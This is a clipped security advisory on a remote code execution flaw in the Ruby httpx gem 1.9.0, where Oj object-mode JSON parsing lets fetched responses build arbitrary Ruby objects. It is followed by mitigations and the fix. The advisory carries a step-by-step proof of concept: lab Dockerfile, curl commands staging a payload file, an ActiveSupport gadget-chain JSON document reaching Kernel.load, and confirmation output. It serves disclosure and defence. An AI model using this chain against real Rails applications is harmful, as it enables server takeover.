---
title: httpx is vulnerable to Remote Code Execution via Oj Object-Mode JSON Deserialization
source: https://research.jfrog.com/vulnerabilities/httpx-is-vulnerable-to-remote-code-execution-via-oj-object-mode-deserialization-cve-2026-129784/
source_host: research.jfrog.com
clip_date: 2026-11-19T09:38:55+08:00
trace_id: ef5c9be9-d499-411b-ab82-b032db8f427e
content_hash: 7a9ffe1bce9c2163f94be488a3435ea43d208be97952f21a0bce9a9acec57fec
status: synced
tags: []
series: null
feed_source: JFrog Security Research·漏洞研究
ai_summary: null
ai_summary_style: null
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 41d75244-d011-81d8-8fe9-c92156bab2d4
ioc:
  cves:
    - CVE-2026-129784
  cwes: []
  hashes:
    - ca8b5f9a8b6533925dfa355f7fbadb64cbfd801cb7e8fa87260ef8a2eae964cc
  domains: []
  tools: []
  techniques: []
---

\## Summary httpx is vulnerable to Remote Code Execution via Oj Object-Mode JSON Deserialization ## Component httpx (gitlab.com/os85/httpx) ## Affected versions 1.9.0 ## Description httpx parses JSON response bodies through its transcoder layer. When the oj gem is loaded and multi_json is absent from the bundle, HTTPX::Response#json decodes the body with Oj.load(response.to_s) and no mode option (lib/httpx/transcoder/json.rb), so Oj runs in its shipped default:object mode. In that mode a JSON document can instantiate any already-loaded Ruby class and set its instance variables, which turns a fetched response body into attacker-controlled Ruby objects. An attacker who can influence the URL an application fetches reaches this sink over the network with no user interaction. With ActiveSupport loaded, as in any Rails application, a universal gadget chain through ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy and ActiveSupport::Cache::Coder::LazyEntry reaches Kernel.load and executes an attacker-chosen file, giving remote code execution as the application user. The file can be staged without any upload feature: an ordinary multipart/form-data POST makes Rack materialize the body as a tempfile reachable through /dev/fd/N. Applications that keep multi_json installed, pin a safe process-wide Oj.default_options, or pass an explicit safe mode at the call site are not affected. Fixed in httpx 1.9.1. ## PoC  
\*\*Step 1 - Build and start a vulnerable httpx 1.9.0 service\*\*  
The lab app loads oj before httpx, then ActiveSupport, and exposes POST /preview, which calls HTTPX.get(url).json on a client-supplied URL. \`\`\` FROM ruby@sha256:ca8b5f9a8b6533925dfa355f7fbadb64cbfd801cb7e8fa87260ef8a2eae964cc RUN apk add --no-cache --virtual.build build-base \\ && gem install httpx --version 1.9.0 --no-document \\ && gem install oj --version 3.17.7 --no-document \\ && gem install activesupport puma rack --no-document \\ && apk del.build WORKDIR /app COPY app.rb. EXPOSE 8080 CMD \["ruby", "app.rb"\] \`\`\`  
\`\`\` docker build -t httpx-victim. docker run -d --name httpx-victim -p 8080:8080 httpx-victim \`\`\`  
\*\*Step 2 - Stage the payload through an ordinary multipart POST\*\*  
Rack materializes multipart file parts as tempfiles with live descriptors in the app process, so no upload feature is needed. \`\`\` curl -s -F "file=@/tmp/payload.rb;type=application/octet-stream" http://127.0.0.1:8080/preview >/dev/null \`\`\`  
\*\*Step 3 - Point /preview at the gadget document\*\*  
Serve a JSON document carrying the ActiveSupport chain, with value aimed at /dev/fd/N, and spray descriptor numbers downward until the staged tempfile executes: \`\`\` {"^o":"ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy", "instance":{"^o":"ActiveSupport::Cache::Coder::LazyEntry", "serializer":{"^c":"Kernel"}, "compressor":false,"resolved":false, "value":"/dev/fd/N"}, "method":"value","var":"@x","deprecator":{"^c":"Kernel"}} \`\`\`  
\`\`\` curl -s -X POST http://127.0.0.1:8080/preview \\ -H 'content-type: application/json' \\ -d '{"url":"http://

:8899/load?fd=N"}' \`\`\`  
Touching the parsed value (even preview\['title'\]) enters DeprecatedInstanceVariableProxy#method_missing, which calls LazyEntry#value, which calls Kernel.load on the staged file.  
\*\*Step 4 - Confirm code execution inside the container\*\*  
\`\`\` docker exec httpx-victim cat /tmp/pwned.txt \`\`\`  
Expected output: \`\`\` RCE via httpx+Oj:object pid=1 \`\`\` ## Vulnerability Mitigations Upgrade to httpx 1.9.1 or later. The fix passes an explicit { mode::strict } default to Oj.load in lib/httpx/transcoder/json.rb, so response bodies can no longer instantiate Ruby objects. The change is commit eeb785d ("json: fix oj integration to avoid RCE mode") and is in the v1.9.1 tag. If upgrading is not possible, pass a safe mode at the call site (response.json(mode::strict)), or set a safe process-wide default such as Oj.default_options = { mode::strict } before any untrusted JSON is parsed. Keeping multi_json in the bundle also avoids the Oj fallback entirely. ## References https://www.cve.org/CVERecord?id=CVE-2026-129784 https://gitlab.com/os85/httpx/-/commit/eeb785d3250eee9379494fb62c37c315a31e327c https://github.com/HoneyryderChuck/httpx/commit/eeb785d3250eee9379494fb62c37c315a31e327c https://github.com/HoneyryderChuck/httpx/releases/tag/v1.9.1 https://gitlab.com/os85/httpx https://github.com/HoneyryderChuck/httpx https://rubygems.org/gems/httpx https://github.com/ohler55/oj/blob/develop/pages/Security.md
